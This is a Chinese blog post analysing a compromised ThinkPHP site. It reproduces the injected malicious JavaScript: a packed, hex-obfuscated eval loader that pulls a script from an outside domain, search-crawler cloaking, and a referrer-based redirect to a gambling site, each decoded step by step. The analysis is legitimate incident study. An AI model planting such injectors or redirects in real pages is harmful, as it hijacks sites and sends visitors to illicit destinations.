---
date: 2019-08-19 10:17:46
title: 记一次网页 js 挂马
description: 网页挂马一般是向页面中加入恶意代码进行转跳、下载木马病毒等操作。
categories:
  - Pentest
tags:
  - js
---

### 0x00 常见网页挂马方式
* iframe 框架挂马  
    简单来说就是加 iframe 标签
* script 挂马  
    通过各种办法加载 js 代码
* htm 文件挂马
    上传 htm 文件，然后用 script 引入
* js 挂马
    上传 js 文件，然后用 script 引入
* 图片伪装挂马
    比较新颖的一种挂马隐蔽方法
* 等等。。。

### 0x01 发现被插入恶意 js
前几天在做子域名搜集，搜集完后提取 title，结果看到了一个站点的 title 不正常

网站是 tp5 的，应该是前段时候 tp5 出现命令执行时被入侵的

查看网页 html 源码发现 title 和 meta 的 description 都被改了
```
<title>&#25250;&#24196;&#29275;&#29275;&#28216;&#25103;&#24179;&#21488;&#44;&#30495;&#38065;&#25250;&#24196;&#29275;&#29275;&#28216;&#25103;&#44;&#25250;&#24196;&#29275;&#29275;&#25163;&#28216;&#19979;&#36733;</title>
<meta name="keywords" content="&#25250;&#24196;&#29275;&#29275;&#28216;&#25103;&#24179;&#21488;&#44;&#30495;&#38065;&#25250;&#24196;&#29275;&#29275;&#28216;&#25103;&#44;&#25250;&#24196;&#29275;&#29275;&#25163;&#28216;&#19979;&#36733;"/>
<meta name="description" content="&#25250;&#24196;&#29275;&#29275;&#12304;&#55;&#49;&#49;&#49;&#48;&#46;&#99;&#111;&#109;&#12305;&#29616;&#20844;&#21496;&#25317;&#26377;&#19968;&#25209;&#26377;&#20960;&#21313;&#24180;&#21644;&#22810;&#25250;&#24196;&#29275;&#29275;&#25216;&#24039;&#24180;&#40831;&#36718;&#27979;&#37327;&#20013;&#24515;&#21046;&#36896;&#32463;&#39564;&#30340;&#20154;&#21592;&#44;&#25250;&#24196;&#29275;&#29275;&#28216;&#25103;&#35268;&#21017;&#38598;&#25104;&#20102;&#22269;&#20869;&#39030;&#23574;&#40831;&#36718;&#27979;&#37327;&#25216;&#26415;"/>
```

解码一下
```
<title>抢庄牛牛游戏平台,真钱抢庄牛牛游戏,抢庄牛牛手游下载</title>
<meta name="keywords" content="抢庄牛牛游戏平台,真钱抢庄牛牛游戏,抢庄牛牛手游下载"/>
<meta name="description" content="抢庄牛牛【71110.com】现公司拥有一批有几十年和多抢庄牛牛技巧年齿轮测量中心制造经验的人员,抢庄牛牛游戏规则集成了国内顶尖齿轮测量技术"/>
```

### 0x02 简单分析
紧接着有一段 js 代码
```
<script>if(navigator.userAgent.toLocaleLowerCase().indexOf("baidu") == -1){document.title ="XXXX-首页"}</script>
<script type="text/javascript">eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('m["\\n\\b\\2\\e\\f\\7\\l\\0"]["\\o\\4\\8\\0\\7"](\'\\j\\1\\2\\4\\8\\3\\0 \\0\\k\\3\\7\\d\\6\\0\\7\\p\\0\\5\\h\\c\\t\\c\\1\\2\\4\\8\\3\\0\\6 \\1\\4\\2\\d\\6\\9\\0\\0\\3\\1\\v\\5\\5\\1\\a\\9\\e\\a\\9\\s\\g\\2\\b\\f\\5\\u\\r\\q\\3\\g\\h\\1\\6\\i\\j\\5\\1\\2\\4\\8\\3\\0\\i\');',32,32,'x74|x73|x63|x70|x72|x2f|x22|x65|x69|x68|x66|x6f|x61|x3d|x75|x6d|x2e|x6a|x3e|x3c|x79|x6e|window|x64|x77|x78|x71|x38|x32|x76|x6b|x3a'.split('|'),0,{}))
</script>
```

第一个 script 标签中判断了 UA 中是否有 baidu 这个字符，应该是判断是否为百度爬虫，不是的话就显示正常的 title

第二个 script 标签的 js 被简单加密了
```
(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('m["\\n\\b\\2\\e\\f\\7\\l\\0"]["\\o\\4\\8\\0\\7"](\'\\j\\1\\2\\4\\8\\3\\0 \\0\\k\\3\\7\\d\\6\\0\\7\\p\\0\\5\\h\\c\\t\\c\\1\\2\\4\\8\\3\\0\\6 \\1\\4\\2\\d\\6\\9\\0\\0\\3\\1\\v\\5\\5\\1\\a\\9\\e\\a\\9\\s\\g\\2\\b\\f\\5\\u\\r\\q\\3\\g\\h\\1\\6\\i\\j\\5\\1\\2\\4\\8\\3\\0\\i\');',32,32,'x74|x73|x63|x70|x72|x2f|x22|x65|x69|x68|x66|x6f|x61|x3d|x75|x6d|x2e|x6a|x3e|x3c|x79|x6e|window|x64|x77|x78|x71|x38|x32|x76|x6b|x3a'.split('|'),0,{}))
```

先在 chrome 的 Console 运行后得到
```
"window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65"]('\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\x22\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22 \x73\x72\x63\x3d\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x66\x68\x75\x66\x68\x32\x2e\x63\x6f\x6d\x2f\x6b\x38\x71\x70\x2e\x6a\x73\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e');"
```

python 将 16 进制转化为字符串
```
>>> '''window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x77\x72\x69\x74\x65"]('\x3c\x73\x63\x72\x69\x70\x74 \x74\x79\x70\x65\x3d\x22\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x22 \x73\x72\x63\x3d\x22\x68\x74\x74\x70\x73\x3a\x2f\x2f\x73\x66\x68\x75\x66\x68\x32\x2e\x63\x6f\x6d\x2f\x6b\x38\x71\x70\x2e\x6a\x73\x22\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e');'''
window["document"]["write"]('<script type="text/javascript" src="https://sfhufh2.com/k8qp.js"></script>');
```

可以看到上面那段加密的代码作用是引入 k8qp.js 这个 js 文件，而这个文件中有下面这一段 js
```
document.writeln("<script LANGUAGE=\"Javascript\">");
document.writeln("var s=document.referrer");
document.writeln(
    "if(s.indexOf(\"baidu\")>0 || s.indexOf(\"sogou\")>0 || s.indexOf(\"soso\")>0 ||s.indexOf(\"sm\")>0 ||s.indexOf(\"uc\")>0 ||s.indexOf(\"bing\")>0 ||s.indexOf(\"yahoo\")>0 ||s.indexOf(\"so\")>0 )"
);
document.writeln("location.href=\"https://71110tz.com/\";");
document.writeln("</script>");
```

判断了 Referer，是 baidu、sogou、soso 之类的话 location.href 跳转到恶意站点 https://71110tz.com/


以上


#### Reference(侵删)：
* [https://www.test404.com/post-655.html?wafcloud=1](https://www.test404.com/post-655.html?wafcloud=1?_blank)
